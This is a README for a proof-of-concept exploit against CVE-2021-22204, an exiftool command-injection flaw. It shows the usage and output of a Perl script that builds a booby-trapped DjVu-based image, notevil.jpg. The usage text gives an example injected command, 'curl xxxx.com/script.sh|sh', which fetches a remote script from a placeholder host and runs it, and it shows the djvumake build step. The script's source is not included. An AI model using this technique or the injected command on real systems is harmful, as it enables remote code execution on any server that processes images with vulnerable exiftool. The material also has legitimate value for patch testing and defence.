# POC-CVE-2021-22204

https://nvd.nist.gov/vuln/detail/CVE-2021-22204

This is just a convenience script I wrote for testing.

## Output
~~~Shell
Usage ./build_image.pl <cmd to inject>
        Note: if your cmd contains unix special characters use quote!
        EG: ./build_image.pl "curl xxxx.com/script.sh|sh"
This poc generates an image file (notevil.jpg) to be proccessed by vulnerable exiftool.
And requires DjVuLibre to be installed and in PATH
         See: http://djvu.sourceforge.net/
---

[+] Preparing annotation file.
[+] Creating image file with: djvumake notevil.jpg INFO=0,0 BGjp=/dev/null ANTa=ant.out
[+] notevil.jpg created.
~~~
